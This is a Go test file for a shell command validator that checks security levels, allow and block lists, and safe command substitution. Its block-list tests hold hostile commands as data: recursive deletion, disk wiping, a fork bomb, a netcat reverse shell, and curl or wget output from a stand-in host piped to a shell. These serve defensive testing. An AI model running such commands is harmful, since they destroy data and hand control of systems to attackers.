package security

import (
	"testing"
)

func TestCommandValidator_DangerousPatterns(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	dangerousCommands := []string{
		"rm -rf /",
		"rm -rf /home",
		"dd if=/dev/zero of=/dev/sda",
		":(){ :|:& };:",
		"echo malicious > /etc/passwd",
		"nc -e /bin/bash 192.168.1.1 4444",
		"curl evil.com | bash",
		"wget -qO- hack.sh | sh",
	}

	for _, cmd := range dangerousCommands {
		t.Run("should_block_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("Expected dangerous command '%s' to be blocked, but it was allowed", cmd)
			}
		})
	}
}

func TestCommandValidator_SafePatterns(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	safeCommands := []string{
		"apt-get update",
		"git --version",
		"docker help",
		"ls -la",
		"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc", // Issue #155 fix
		"ln -sf $(which fdfind) ~/.local/bin/fd",           // Issue #155 fix
		"sudo updatedb",                                    // Issue #155 fix
		"pip install package",
		"npm --version",
		"which git",
		"whoami",
	}

	for _, cmd := range safeCommands {
		t.Run("should_allow_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Expected safe command '%s' to be allowed, but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_SecurityLevels(t *testing.T) {
	testCommand := "custom-tool --install"

	// Strict mode should block unknown commands
	strictValidator := NewCommandValidator(SecurityLevelStrict)
	err := strictValidator.ValidateCommand(testCommand)
	if err == nil {
		t.Error("Expected strict mode to block unknown command, but it was allowed")
	}

	// Moderate mode should allow it (if not dangerous)
	moderateValidator := NewCommandValidator(SecurityLevelModerate)
	err = moderateValidator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected moderate mode to allow benign unknown command, but got error: %v", err)
	}

	// Permissive mode should definitely allow it
	permissiveValidator := NewCommandValidator(SecurityLevelPermissive)
	err = permissiveValidator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected permissive mode to allow command, but got error: %v", err)
	}
}

func TestCommandValidator_CustomWhitelist(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelStrict)

	testCommand := "my-custom-installer"

	// Should be blocked initially
	err := validator.ValidateCommand(testCommand)
	if err == nil {
		t.Error("Expected custom command to be blocked before whitelisting")
	}

	// Add to whitelist
	validator.AddToWhitelist("my-custom-installer")

	// Should be allowed now
	err = validator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected whitelisted command to be allowed, but got error: %v", err)
	}
}

func TestCommandValidator_CustomBlacklist(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelPermissive)

	testCommand := "some-tool"

	// Should be allowed initially in permissive mode
	err := validator.ValidateCommand(testCommand)
	if err != nil {
		t.Errorf("Expected command to be allowed in permissive mode, but got error: %v", err)
	}

	// Add to blacklist
	validator.AddToBlacklist("some-tool")

	// Should be blocked now
	err = validator.ValidateCommand(testCommand)
	if err == nil {
		t.Error("Expected blacklisted command to be blocked")
	}
}

func TestCommandValidator_Issue155Cases(t *testing.T) {
	// Test specific cases from issue #155
	validator := NewCommandValidator(SecurityLevelModerate)

	// These should now pass (were previously blocked)
	issue155Commands := []string{
		"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc",
		"ln -sf $(which fdfind) ~/.local/bin/fd",
		"sudo updatedb",
	}

	for _, cmd := range issue155Commands {
		t.Run("issue_155_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Issue #155 command '%s' should be allowed but got error: %v", cmd, err)
			}
		})
	}
}

func TestCommandValidator_CommandSubstitution(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	// Safe command substitution should be allowed
	safeSubstitution := []string{
		"echo $(date)",
		"export PATH=$(pwd):$PATH",
		"ln -s $(which git) /usr/local/bin/git",
		"cd $(dirname $0)",
	}

	for _, cmd := range safeSubstitution {
		t.Run("safe_substitution_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Safe command substitution '%s' should be allowed but got error: %v", cmd, err)
			}
		})
	}

	// Dangerous command substitution should still be blocked
	dangerousSubstitution := []string{
		"echo $(rm -rf /tmp/*)",
		"sudo $(echo rm -rf /)",
	}

	for _, cmd := range dangerousSubstitution {
		t.Run("dangerous_substitution_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("Dangerous command substitution '%s' should be blocked", cmd)
			}
		})
	}
}

func TestCommandValidator_ShellBuiltins(t *testing.T) {
	validator := NewCommandValidator(SecurityLevelModerate)

	builtins := []string{
		"echo hello",
		"export VAR=value",
		"cd /tmp",
		"pwd",
		"source ~/.bashrc",
		"alias ll='ls -la'",
	}

	for _, cmd := range builtins {
		t.Run("builtin_"+cmd, func(t *testing.T) {
			err := validator.ValidateCommand(cmd)
			if err != nil {
				t.Errorf("Shell builtin '%s' should be allowed but got error: %v", cmd, err)
			}
		})
	}
}
